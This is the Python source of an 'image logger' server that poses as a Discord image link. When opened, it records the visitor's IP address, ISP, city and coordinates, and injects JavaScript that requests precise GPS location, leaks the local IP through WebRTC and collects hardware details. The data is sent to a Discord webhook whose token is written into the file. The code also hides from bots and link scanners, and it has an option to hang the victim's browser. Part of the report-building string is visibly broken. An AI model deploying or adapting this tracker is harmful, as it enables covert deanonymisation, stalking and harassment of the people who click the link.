from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, re, socket
from datetime import datetime

__app__ = "Advanced Discord Image Logger"
__description__ = "Enhanced IP and system information logger using Discord's Open Original feature"
__version__ = "v3.0"
__author__ = "Modified from DeKrypt's original"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1393606647284240474/eKXLQCymBvY7bUkhinRce9uawJGkflevGcaRQ9blNoQK4frDA6tt09CC2rKOvOIcQ18a",
    "image": "https://assets.telegraphindia.com/telegraph/2023/Jan/1672986231_rick-rolled.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Advanced Logger",
    "color": 0x00FFFF,
    "avatar_url": "",  # Optional webhook avatar URL

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": True,  # Now enabled by default with better implementation
    "disableVpnCheck": False,  # Set to True to bypass VPN checks completely
    "extendedDataCollection": True,  # Gathers additional system info
    
    "message": {
        "doMessage": True,
        "message": "This browser has been analyzed by our security system.",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # ENHANCED OPTIONS #
    "collectScreenData": True,  # Attempt to get screen resolution
    "collectTimezone": True,   # Get detailed timezone info
    "collectLanguage": True,   # Get browser language
    "collectCookies": False,   # Experimental - requires JavaScript
    "collectWebRTC": True,     # Attempt to get internal IP via WebRTC

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return None

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    elif "bingbot" in useragent.lower():
        return "Bing Bot"
    elif "yandex" in useragent.lower():
        return "Yandex Bot"
    elif "slurp" in useragent.lower():
        return "Yahoo Bot"
    else:
        return False

def reportError(error):
    error_embed = {
        "username": config["username"],
        "content": "@here",
        "embeds": [
            {
                "title": "Logger Error",
                "color": 0xFF0000,
                "description": f"```\n{error[:1800]}\n```",
                "timestamp": datetime.utcnow().isoformat()
            }
        ]
    }
    if config.get("avatar_url"):
        error_embed["avatar_url"] = config["avatar_url"]
    
    try:
        requests.post(config["webhook"], json=error_embed, timeout=10)
    except:
        pass

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additional_data=None):
    if ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            alert_data = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Bot Detected",
                        "color": config["color"],
                        "description": f"Bot interaction detected\n\n**IP:** `{ip}`\n**Type:** `{bot}`\n**Endpoint:** `{endpoint}`",
                        "timestamp": datetime.utcnow().isoformat()
                    }
                ]
            }
            if config.get("avatar_url"):
                alert_data["avatar_url"] = config["avatar_url"]
            
            try:
                requests.post(config["webhook"], json=alert_data, timeout=10)
            except:
                pass
        return None

    info = get_geolocation(ip)
    if not info:
        info = {
            "status": "fail",
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": 0,
            "lon": 0,
            "timezone": "Unknown",
            "mobile": False,
            "proxy": False,
            "hosting": False
        }

    if config["disableVpnCheck"]:
        info["proxy"] = False

    ping = "@everyone"
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return info
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return info
        elif config["antiBot"] == 3:
            return info
        elif config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        os, browser = "Unknown", "Unknown"

    # Extended data collection
    extended_info = ""
    if config["extendedDataCollection"] and additional_data:
        extended_info = "\n**Extended Info:**"
        if additional_data.get("screen"):
            extended_info += f"\n> **Screen:** `{additional_data['screen']}`"
        if additional_data.get("timezone"):
            extended_info += f"\n> **Detailed Timezone:** `{additional_data['timezone']}`"
        if additional_data.get("language"):
            extended_info += f"\n> **Language:** `{additional_data['language']}`"
        if additional_data.get("webRTC"):
            extended_info += f"\n> **Local IP:** `{additional_data['webRTC']}`"
        if additional_data.get("cpu"):
            extended_info += f"\n> **CPU Cores:** `{additional_data['cpu']}`"
        if additional_data.get("ram"):
            extended_info += f"\n> **RAM:** `{additional_data['ram']}`"
        if additional_data.get("gpu"):
            extended_info += f"\n> **GPU:** `{additional_data['gpu']}`"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Advanced Logger - New Hit",
                "color": config["color"],
                "description": f"""**New Connection Logged**

**Endpoint:** `{endpoint}`
**Timestamp:** `{datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ') if '/' in info['timezone'] else info['timezone']} ({info['timezone'].split('/')[0] if '/' in info['timezone'] else 'Unknown'})`
> **Mobile:** `{info['mobile']}`
> **VPN/Proxy:** `{info['proxy']}`
> **Hosting/Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**System Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent:**
                "timestamp": datetime.utcnow().isoformat()
            }
        ]
    }
    
    if config.get("avatar_url"):
        embed["avatar_url"] = config["avatar_url"]
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class AdvancedLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Parse URL parameters
            s = self.path
            query = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # Get image URL
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()
            else:
                url = config["image"]
            
            # Prepare additional data collection
            additional_data = {}
            
            # Get client IP
            ip = self.headers.get('x-forwarded-for') or self.headers.get('x-real-ip')
            if not ip and hasattr(self, 'client_address'):
                ip = self.client_address[0]
            
            # Skip blacklisted IPs
            if ip.startswith(blacklistedIPs):
                return
            
            # Check for bots
            user_agent = self.headers.get('user-agent', 'Unknown')
            if bot_check := botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return
            
            # Handle geolocation
            location = None
            if query.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(query.get("g").encode()).decode()
                except:
                    pass
            
            # Collect extended data
            if config["extendedDataCollection"]:
                if query.get("screen") and config["collectScreenData"]:
                    try:
                        additional_data["screen"] = base64.b64decode(query.get("screen").encode()).decode()
                    except:
                        pass
                
                if query.get("tz") and config["collectTimezone"]:
                    try:
                        additional_data["timezone"] = base64.b64decode(query.get("tz").encode()).decode()
                    except:
                        pass
                
                if query.get("lang") and config["collectLanguage"]:
                    try:
                        additional_data["language"] = base64.b64decode(query.get("lang").encode()).decode()
                    except:
                        pass
                
                if query.get("rtc") and config["collectWebRTC"]:
                    try:
                        additional_data["webRTC"] = base64.b64decode(query.get("rtc").encode()).decode()
                    except:
                        pass
                
                if query.get("hw") and config["extendedDataCollection"]:
                    try:
                        hw_data = json.loads(base64.b64decode(query.get("hw").encode()).decode())
                        if isinstance(hw_data, dict):
                            additional_data.update(hw_data)
                    except:
                        pass
            
            # Generate report
            result = makeReport(
                ip,
                user_agent,
                location,
                s.split("?")[0],
                url,
                additional_data
            )
            
            # Prepare response
            message = config["message"]["message"]
            
            if config["message"]["richMessage"] and result:
                replacements = {
                    "{ip}": ip,
                    "{isp}": result.get("isp", "Unknown"),
                    "{asn}": result.get("as", "Unknown"),
                    "{country}": result.get("country", "Unknown"),
                    "{region}": result.get("regionName", "Unknown"),
                    "{city}": result.get("city", "Unknown"),
                    "{lat}": str(result.get("lat", 0)),
                    "{long}": str(result.get("lon", 0)),
                    "{timezone}": result.get("timezone", "Unknown").split('/')[-1].replace('_', ' '),
                    "{mobile}": str(result.get("mobile", False)),
                    "{vpn}": str(result.get("proxy", False)),
                    "{bot}": str(result.get("hosting", False)),
                    "{browser}": httpagentparser.simple_detect(user_agent)[1],
                    "{os}": httpagentparser.simple_detect(user_agent)[0]
                }
                
                for placeholder, value in replacements.items():
                    message = message.replace(placeholder, value)
            
            # Prepare response data
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            elif config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            elif config["message"]["doMessage"]:
                data = message.encode()
            else:
                data = f'''<style>body {{
                    margin: 0;
                    padding: 0;
                }}
                div.img {{
                    background-image: url('{url}');
                    background-position: center center;
                    background-repeat: no-repeat;
                    background-size: contain;
                    width: 100vw;
                    height: 100vh;
                }}</style><div class="img"></div>'''.encode()
            
            # Add JavaScript for additional data collection
            js_script = b""
            if config["accurateLocation"]:
                js_script += b"""
<script>
// Geolocation
var currenturl = window.location.href;
if (!currenturl.includes("g=") && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(coords) {
        var newUrl = currenturl.includes("?") ? 
            currenturl + "&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D") :
            currenturl + "?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
        location.replace(newUrl);
    }, function(error) {
        console.log("Geolocation error:", error);
    });
}
"""
            
            if config["extendedDataCollection"]:
                js_script += b"""
// Screen resolution
if (!currenturl.includes("screen=")) {
    var screenInfo = window.screen.width + "x" + window.screen.height;
    if (currenturl.includes("?")) {
        currenturl += "&screen=" + btoa(screenInfo).replace(/=/g, "%3D");
    } else {
        currenturl += "?screen=" + btoa(screenInfo).replace(/=/g, "%3D");
    }
}

// Timezone
if (!currenturl.includes("tz=")) {
    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (currenturl.includes("?")) {
        currenturl += "&tz=" + btoa(timezone).replace(/=/g, "%3D");
    } else {
        currenturl += "?tz=" + btoa(timezone).replace(/=/g, "%3D");
    }
}

// Language
if (!currenturl.includes("lang=")) {
    var language = navigator.language || navigator.userLanguage;
    if (currenturl.includes("?")) {
        currenturl += "&lang=" + btoa(language).replace(/=/g, "%3D");
    } else {
        currenturl += "?lang=" + btoa(language).replace(/=/g, "%3D");
    }
}

// WebRTC (local IP)
if (!currenturl.includes("rtc=")) {
    var rtcScript = document.createElement('script');
    rtcScript.src = 'https://cdn.jsdelivr.net/npm/webrtc-adapter@7.4.0/adapter.min.js';
    rtcScript.onload = function() {
        var pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(function(offer) {
            return pc.setLocalDescription(offer);
        }).catch(function(e) {
            console.log("WebRTC error:", e);
        });
        pc.onicecandidate = function(ice) {
            if (ice.candidate) {
                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ipMatch = ipRegex.exec(ice.candidate.candidate);
                if (ipMatch) {
                    var localIp = ipMatch[1];
                    if (currenturl.includes("?")) {
                        currenturl += "&rtc=" + btoa(localIp).replace(/=/g, "%3D");
                    } else {
                        currenturl += "?rtc=" + btoa(localIp).replace(/=/g, "%3D");
                    }
                    location.replace(currenturl);
                }
            }
        };
    };
    document.head.appendChild(rtcScript);
}

// Hardware info (experimental)
if (!currenturl.includes("hw=")) {
    var hardwareInfo = {};
    
    // CPU cores
    hardwareInfo.cpu = navigator.hardwareConcurrency || "Unknown";
    
    // RAM (approximate)
    if (navigator.deviceMemory) {
        hardwareInfo.ram = navigator.deviceMemory + " GB";
    }
    
    // GPU (if available)
    if (navigator.gpu) {
        navigator.gpu.requestAdapter().then(function(adapter) {
            hardwareInfo.gpu = adapter.name || "Unknown";
            if (currenturl.includes("?")) {
                currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
            } else {
                currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
            }
            location.replace(currenturl);
        }).catch(function() {
            if (currenturl.includes("?")) {
                currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
            } else {
                currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
            }
            location.replace(currenturl);
        });
    } else {
        if (currenturl.includes("?")) {
            currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
        } else {
            currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
        }
        location.replace(currenturl);
    }
}
</script>
"""
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data + js_script)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = AdvancedLoggerAPI    
